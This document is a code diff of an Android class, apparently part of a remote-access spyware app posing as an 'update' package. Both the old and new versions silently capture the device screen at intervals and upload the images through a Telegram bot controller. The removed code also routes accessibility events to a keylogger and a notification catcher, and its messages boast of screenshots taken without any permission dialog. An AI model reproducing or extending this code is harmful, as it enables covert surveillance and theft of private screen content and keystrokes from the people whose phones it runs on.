@@ -1,167 +1,157 @@
 package com.kasari.update;
 
-import android.accessibilityservice.AccessibilityService;
-import android.annotation.SuppressLint;
+import android.content.Context;
+import android.content.Intent;
 import android.graphics.Bitmap;
-import android.os.*;
-import android.view.accessibility.AccessibilityEvent;
-import java.io.*;
-import java.util.concurrent.*;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.os.Handler;
+import android.util.Base64;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
+import java.io.ByteArrayOutputStream;
+import java.nio.ByteBuffer;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
-public class ScreenMirror extends AccessibilityService {
+public class ScreenMirror {
 
-    public static volatile ScreenMirror instance = null;
+    private static MediaProjection mediaProjection;
+    private static VirtualDisplay virtualDisplay;
+    private static ImageReader imageReader;
+    private static int screenWidth;
+    private static int screenHeight;
+    private static int screenDensity;
+    private static boolean isCapturing = false;
+    private static Handler handler = new Handler();
+    private static Context contextRef;
 
-    private volatile boolean mContinuous = false;
-    private int              mInterval   = 30;
-    private Handler          mHandler;
-    private HandlerThread    mThread;
+    public static void setProjectionData(Context context, int resultCode, Intent data) {
+        contextRef = context;
+        MediaProjectionManager manager = 
+            (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        if (manager != null) {
+            mediaProjection = manager.getMediaProjection(resultCode, data);
+        }
+    }
 
-    private final Runnable mContTask = new Runnable() {
-        @Override public void run() {
-            if (!mContinuous) return;
-            doCapture();
-            if (mContinuous) mHandler.postDelayed(this, mInterval * 1000L);
+    public static void startCapture(Context context) {
+        if (isCapturing) {
+            TelegramController.sendMessage(context, "📱 Screen capture already running");
+            return;
+        }
+        
+        contextRef = context;
+        
+        if (mediaProjection == null) {
+            TelegramController.sendMessage(context, "📱 Screen capture permission not granted. Re-install app.");
+            return;
+        }
+        
+        try {
+            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            windowManager.getDefaultDisplay().getMetrics(metrics);
+            
+            screenWidth = metrics.widthPixels;
+            screenHeight = metrics.heightPixels;
+            screenDensity = metrics.densityDpi;
+            
+            imageReader = ImageReader.newInstance(screenWidth, screenHeight, 
+                PixelFormat.RGBA_8888, 2);
+            
+            virtualDisplay = mediaProjection.createVirtualDisplay(
+                "KasariScreenCapture",
+                screenWidth, screenHeight, screenDensity,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader.getSurface(), null, null);
+            
+            isCapturing = true;
+            
+            TelegramController.sendMessage(context, 
+                "📱 Screen mirror started\nCapturing every 15 seconds");
+            
+            handler.postDelayed(captureRunnable, 15000);
+            
+        } catch (Exception e) {
+            e.printStackTrace();
+            TelegramController.sendMessage(context, "📱 Screen mirror failed to start");
+        }
+    }
+
+    private static Runnable captureRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isCapturing) {
+                captureScreenshot();
+                handler.postDelayed(this, 15000);
+            }
         }
     };
 
-    @Override
-    protected void onServiceConnected() {
-        super.onServiceConnected();
-        instance = this;
-        mThread = new HandlerThread("AccCap");
-        mThread.start();
-        mHandler = new Handler(mThread.getLooper());
-        TelegramController.sendMessage(
-            "✅ Accessibility Service ON!\n" +
-            "Ab /screenshot, /screen_record, /keylog sab kaam karenge bina kisi permission dialog ke.");
-    }
-
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        // Delegate to keylogger and notification catcher
-        KeyloggerService.onEvent(event);
-        NotificationCatcher.onEvent(event);
-    }
-
-    @Override public void onInterrupt() {}
-
-    @Override
-    public void onDestroy() {
-        instance = null;
-        mContinuous = false;
-        if (mHandler != null) { mHandler.removeCallbacksAndMessages(null); mHandler = null; }
-        if (mThread  != null) { mThread.quit(); mThread = null; }
-        super.onDestroy();
-    }
-
-    // ─── Single screenshot ────────────────────────────────────────────────────
-    public void requestCapture() {
-        if (mHandler != null) mHandler.post(this::doCapture);
-    }
-
-    // ─── Continuous mode ──────────────────────────────────────────────────────
-    public void startContinuous(int intervalSec) {
-        mContinuous = true;
-        mInterval   = Math.max(5, intervalSec);
-        if (mHandler != null) {
-            mHandler.removeCallbacks(mContTask);
-            mHandler.post(mContTask);
-        }
-        TelegramController.sendMessage("📺 Har " + mInterval + "s screenshot. /screen_stop se band karo.");
-    }
-
-    public void stopContinuous() {
-        mContinuous = false;
-        if (mHandler != null) mHandler.removeCallbacks(mContTask);
-        TelegramController.sendMessage("🛑 Screenshot mode band.");
-    }
-
-    // ─── Sync frame capture (used by ScreenRecordService) ────────────────────
-    @SuppressLint("NewApi")
-    public Bitmap captureFrameSync(long timeoutMs) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null;
-        CountDownLatch latch = new CountDownLatch(1);
-        Bitmap[] result = {null};
-        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(),
-            new TakeScreenshotCallback() {
-                @Override
-                public void onSuccess(ScreenshotResult r) {
-                    try {
-                        android.hardware.HardwareBuffer hwBuf = r.getHardwareBuffer();
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                            Bitmap hw = Bitmap.wrapHardwareBuffer(hwBuf, r.getColorSpace());
-                            if (hw != null) {
-                                result[0] = hw.copy(Bitmap.Config.ARGB_8888, false);
-                                hw.recycle();
-                            }
-                        }
-                        hwBuf.close();
-                    } catch (Exception ignored) {}
-                    latch.countDown();
-                }
-                @Override public void onFailure(int code) { latch.countDown(); }
-            });
-        try { latch.await(timeoutMs, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
-        return result[0];
-    }
-
-    // ─── Internal capture ────────────────────────────────────────────────────
-    @SuppressLint("NewApi")
-    private void doCapture() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            TelegramController.sendMessage("❌ Android 11+ chahiye silent screenshot ke liye.");
-            return;
-        }
-        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(),
-            new TakeScreenshotCallback() {
-                @Override
-                public void onSuccess(ScreenshotResult r) {
-                    new Thread(() -> processResult(r)).start();
-                }
-                @Override
-                public void onFailure(int code) {
-                    TelegramController.sendMessage("❌ Screenshot fail (code:" + code + ")");
-                }
-            });
-    }
-
-    @SuppressLint("NewApi")
-    private void processResult(ScreenshotResult result) {
-        Bitmap bmp = null;
+    private static void captureScreenshot() {
         try {
-            android.hardware.HardwareBuffer hwBuf = result.getHardwareBuffer();
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                Bitmap hw = Bitmap.wrapHardwareBuffer(hwBuf, result.getColorSpace());
-                if (hw != null) {
-                    bmp = hw.copy(Bitmap.Config.ARGB_8888, false);
-                    hw.recycle();
+            if (imageReader == null) return;
+            
+            Image image = imageReader.acquireLatestImage();
+            if (image != null) {
+                Image.Plane[] planes = image.getPlanes();
+                ByteBuffer buffer = planes[0].getBuffer();
+                int pixelStride = planes[0].getPixelStride();
+                int rowStride = planes[0].getRowStride();
+                int rowPadding = rowStride - pixelStride * screenWidth;
+                
+                Bitmap bitmap = Bitmap.createBitmap(
+                    screenWidth + rowPadding / pixelStride, 
+                    screenHeight, Bitmap.Config.ARGB_8888);
+                bitmap.copyPixelsFromBuffer(buffer);
+                
+                if (rowPadding > 0) {
+                    bitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                 }
+                
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
+                byte[] imageBytes = baos.toByteArray();
+                
+                String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
+                    Locale.getDefault()).format(new Date());
+                
+                TelegramController.sendPhoto(contextRef, imageBytes, 
+                    "📱 Screen Captured\nTime: " + timestamp);
+                
+                image.close();
+                bitmap.recycle();
             }
-            hwBuf.close();
         } catch (Exception e) {
-            TelegramController.sendMessage("❌ Screenshot error: " + e.getMessage());
-            return;
+            e.printStackTrace();
         }
-        if (bmp == null) {
-            TelegramController.sendMessage("❌ Bitmap null. Android 12+ chahiye.");
-            return;
+    }
+
+    public static void stopCapture(Context context) {
+        isCapturing = false;
+        handler.removeCallbacksAndMessages(null);
+        
+        if (virtualDisplay != null) {
+            virtualDisplay.release();
+            virtualDisplay = null;
         }
-        try {
-            int maxW = 1080;
-            if (bmp.getWidth() > maxW) {
-                float scale = (float) maxW / bmp.getWidth();
-                Bitmap sc = Bitmap.createScaledBitmap(bmp, maxW, (int)(bmp.getHeight() * scale), true);
-                bmp.recycle(); bmp = sc;
-            }
-            File f = new File(getCacheDir(), "shot_" + System.currentTimeMillis() + ".jpg");
-            FileOutputStream fos = new FileOutputStream(f);
-            bmp.compress(Bitmap.CompressFormat.JPEG, 85, fos);
-            fos.close(); bmp.recycle();
-            TelegramController.sendPhoto(f, "📱 Screenshot");
-            f.delete();
-        } catch (Exception e) {
-            TelegramController.sendMessage("❌ Screenshot send error: " + e.getMessage());
+        if (imageReader != null) {
+            imageReader.close();
+            imageReader = null;
         }
+        
+        TelegramController.sendMessage(context, "🛑 Screen mirror stopped");
+    }
+
+    public static boolean isCapturing() {
+        return isCapturing;
     }
 }
